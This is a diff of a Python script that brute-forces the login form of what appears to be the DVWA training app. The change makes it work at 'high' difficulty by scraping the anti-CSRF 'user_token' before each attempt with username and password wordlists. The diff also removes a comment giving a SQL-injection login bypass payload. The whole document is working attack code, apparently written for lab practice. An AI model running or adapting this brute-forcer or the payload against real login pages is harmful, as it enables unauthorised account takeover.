@@ -1,20 +1,19 @@
 #!/usr/bin/env python3
 
 import requests
+from bs4 import BeautifulSoup
 
 from conf import BASE_URL
 from util import http_get
 
-# We can also use the SQLi with the payload "' OR 1=1 LIMIT 1 --"
-
 USERNAME_WORDLISTS = "./src/bruteforce/username.txt"
 PASSWORD_WORDLISTS = "./src/bruteforce/passwords.txt"
 
-DIFFICULTY = "low"
+DIFFICULTY = "high"
 
 # -----------------------
 
-def bruteforce_low():
+def bruteforce_high():
     global USERNAME_WORDLISTS, PASSWORD_WORDLISTS
     
     usernames = get_wordlist(USERNAME_WORDLISTS)
@@ -27,7 +26,7 @@ def bruteforce_low():
         for password in passwords:
             print(f"[INFO]: Testing: ({user}:{password})")
             if check_credentials(user, password):
-                print(f"[INFO]: Found credentials: ({user}:{password})")
+                print(f"[INFO]: Found credentials: ({user}:{password})!")
                 break
 
 # -----------------------
@@ -41,6 +40,14 @@ def check_credentials(username, password):
     global BASE_URL, DIFFICULTY
     
     URL = BASE_URL + "/vulnerabilities/brute/"
-    params = {"username": username, "password": password, "Login": "Login"}
+
+    # first get CSRF token
+    r = http_get(URL, DIFFICULTY)
+    soup = BeautifulSoup(r.text, "html.parser")
+    csrf_token = soup.find("input", {"name": "user_token"})['value']
+
+    # then actually check the credentials
+    params = {"username": username, "password": password, "Login": "Login", "user_token": csrf_token}
     r = http_get(URL, DIFFICULTY, params=params)
+
     return "Welcome to the password protected area admin" in r.text
